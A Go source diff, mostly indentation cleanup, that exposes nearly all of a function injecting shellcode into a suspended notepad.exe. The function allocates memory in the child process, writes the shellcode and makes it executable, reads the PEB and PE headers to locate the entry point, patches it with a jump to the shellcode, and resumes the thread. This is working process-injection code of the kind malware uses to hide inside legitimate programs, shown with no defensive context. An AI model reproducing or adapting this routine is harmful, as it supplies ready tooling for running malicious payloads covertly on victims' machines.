@@ -5,7 +5,7 @@ import (
 	"fmt"
 	"log"
 	"syscall"
-  "errors"
+	"errors"
 	"unsafe"
 
 	// Sub Repositories
@@ -24,27 +24,27 @@ func CreateProcess(shellcode []byte) (error) {
 
 	procInfo := &windows.ProcessInformation{}
 	startupInfo := &windows.StartupInfo{
-		Flags:      windows.STARTF_USESTDHANDLES | windows.CREATE_SUSPENDED,
+		Flags: windows.STARTF_USESTDHANDLES | windows.CREATE_SUSPENDED,
 	}
 
 	errCreateProcess := windows.CreateProcess(syscall.StringToUTF16Ptr("C:\\Windows\\System32\\notepad.exe"), syscall.StringToUTF16Ptr(""), nil, nil, true, windows.CREATE_SUSPENDED, nil, nil, startupInfo, procInfo)
 	if errCreateProcess != nil {
-    return errCreateProcess
+		return errCreateProcess
 	}
 	
-  addr, _, _ := VirtualAllocEx.Call(uintptr(procInfo.Process), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
+	addr, _, _ := VirtualAllocEx.Call(uintptr(procInfo.Process), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
 
 	if addr == 0 {
 		return errors.New("VirtualAllocEx failed and returned 0")
 	}
 
 	// Write shellcode into child process memory
-  WriteProcessMemory.Call(uintptr(procInfo.Process), addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
+  	WriteProcessMemory.Call(uintptr(procInfo.Process), addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
 
 	oldProtect := windows.PAGE_READWRITE
-  VirtualProtectEx.Call(uintptr(procInfo.Process), addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
+	VirtualProtectEx.Call(uintptr(procInfo.Process), addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
 
-  type PEB struct {
+	type PEB struct {
 		InheritedAddressSpace    byte    // BYTE	0
 		ReadImageFileExecOptions byte    // BYTE	1
 		BeingDebugged            byte    // BYTE	2
@@ -95,7 +95,7 @@ func CreateProcess(shellcode []byte) (error) {
 	var peb PEB
 	var readBytes int32
 
-  ReadProcessMemory.Call(uintptr(procInfo.Process), processInformation.PebBaseAddress, uintptr(unsafe.Pointer(&peb)), unsafe.Sizeof(peb), uintptr(unsafe.Pointer(&readBytes)))
+	ReadProcessMemory.Call(uintptr(procInfo.Process), processInformation.PebBaseAddress, uintptr(unsafe.Pointer(&peb)), unsafe.Sizeof(peb), uintptr(unsafe.Pointer(&readBytes)))
 
 	// Read the child program's DOS header and validate it is a MZ executable
 	type IMAGE_DOS_HEADER struct {
@@ -123,7 +123,7 @@ func CreateProcess(shellcode []byte) (error) {
 	var dosHeader IMAGE_DOS_HEADER
 	var readBytes2 int32
 
-  ReadProcessMemory.Call(uintptr(procInfo.Process), peb.ImageBaseAddress, uintptr(unsafe.Pointer(&dosHeader)), unsafe.Sizeof(dosHeader), uintptr(unsafe.Pointer(&readBytes2)))
+	ReadProcessMemory.Call(uintptr(procInfo.Process), peb.ImageBaseAddress, uintptr(unsafe.Pointer(&dosHeader)), unsafe.Sizeof(dosHeader), uintptr(unsafe.Pointer(&readBytes2)))
 
 	// 23117 is the LittleEndian unsigned base10 representation of MZ
 	// 0x5a4d is the LittleEndian unsigned base16 represenation of MZ
@@ -230,9 +230,9 @@ func CreateProcess(shellcode []byte) (error) {
 	var readBytes5 int32
 
 	if peHeader.Machine == 34404 { // 0x8664
-	  ReadProcessMemory.Call(uintptr(procInfo.Process), peb.ImageBaseAddress+uintptr(dosHeader.LfaNew)+unsafe.Sizeof(Signature)+unsafe.Sizeof(peHeader), uintptr(unsafe.Pointer(&optHeader64)), unsafe.Sizeof(optHeader64), uintptr(unsafe.Pointer(&readBytes5)))
+		ReadProcessMemory.Call(uintptr(procInfo.Process), peb.ImageBaseAddress+uintptr(dosHeader.LfaNew)+unsafe.Sizeof(Signature)+unsafe.Sizeof(peHeader), uintptr(unsafe.Pointer(&optHeader64)), unsafe.Sizeof(optHeader64), uintptr(unsafe.Pointer(&readBytes5)))
 	} else if peHeader.Machine == 332 { // 0x14c
-    ReadProcessMemory.Call(uintptr(procInfo.Process), peb.ImageBaseAddress+uintptr(dosHeader.LfaNew)+unsafe.Sizeof(Signature)+unsafe.Sizeof(peHeader), uintptr(unsafe.Pointer(&optHeader32)), unsafe.Sizeof(optHeader32), uintptr(unsafe.Pointer(&readBytes5)))
+		ReadProcessMemory.Call(uintptr(procInfo.Process), peb.ImageBaseAddress+uintptr(dosHeader.LfaNew)+unsafe.Sizeof(Signature)+unsafe.Sizeof(peHeader), uintptr(unsafe.Pointer(&optHeader32)), unsafe.Sizeof(optHeader32), uintptr(unsafe.Pointer(&readBytes5)))
 	} else {
 		return errors.New(fmt.Sprintf("Unknow IMAGE_OPTIONAL_HEADER type for machine type: 0x%x", peHeader.Machine))
 	}
@@ -261,14 +261,14 @@ func CreateProcess(shellcode []byte) (error) {
 		binary.LittleEndian.PutUint32(shellcodeAddressBuffer, uint32(addr))
 		epBuffer = append(epBuffer, shellcodeAddressBuffer...)
 	} else {
-		return errors.New(fmt.Sprintf("[!]Unknow IMAGE_OPTIONAL_HEADER type for machine type: 0x%x", peHeader.Machine))
+		return errors.New(fmt.Sprintf("Unknow IMAGE_OPTIONAL_HEADER type for machine type: 0x%x", peHeader.Machine))
 	}
 
 	// 0xff ; 0xe0 = jmp [r|e]ax
 	epBuffer = append(epBuffer, byte(0xff))
 	epBuffer = append(epBuffer, byte(0xe0))
 
-  WriteProcessMemory.Call(uintptr(procInfo.Process), ep, uintptr(unsafe.Pointer(&epBuffer[0])), uintptr(len(epBuffer)))
+	WriteProcessMemory.Call(uintptr(procInfo.Process), ep, uintptr(unsafe.Pointer(&epBuffer[0])), uintptr(len(epBuffer)))
 
 	// Resume the child process
 	_, errResumeThread := windows.ResumeThread(procInfo.Thread)
@@ -285,9 +285,9 @@ func CreateProcess(shellcode []byte) (error) {
 	// Close the hand to the child process thread
 	errCloseThreadHandle := windows.CloseHandle(procInfo.Thread)
 	if errCloseThreadHandle != nil {
-    return errors.New(fmt.Sprintf("Error closing the child process thread handle:\r\n\t%s", errCloseThreadHandle.Error()))
+		return errors.New(fmt.Sprintf("Error closing the child process thread handle:\r\n\t%s", errCloseThreadHandle.Error()))
 	}
 
-  return nil
+	return nil
 }
 
